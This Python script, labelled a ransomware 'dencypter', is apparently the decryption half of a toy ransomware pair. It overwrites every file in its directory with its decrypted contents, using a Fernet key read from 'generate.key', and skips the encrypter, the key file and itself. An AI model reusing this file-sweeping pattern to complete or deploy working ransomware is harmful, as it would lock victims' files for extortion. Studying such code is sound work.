"""ransomware dencypter."""
import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if (
        file == "ransomware_encypter.py"
        or file == "generate.key"
        or file == "ransomware_dencypter.py"
    ):
        continue

    if os.path.isfile(file):
        files.append(file)

with open("generate.key", "rb") as keyfile:
    key = keyfile.read()

for file in files:
    with open(file, "rb") as open_file:
        clear_content = open_file.read()

    dencrypt = Fernet(key).decrypt(clear_content)

    with open(file, "wb") as write_file:
        write_file.write(dencrypt)
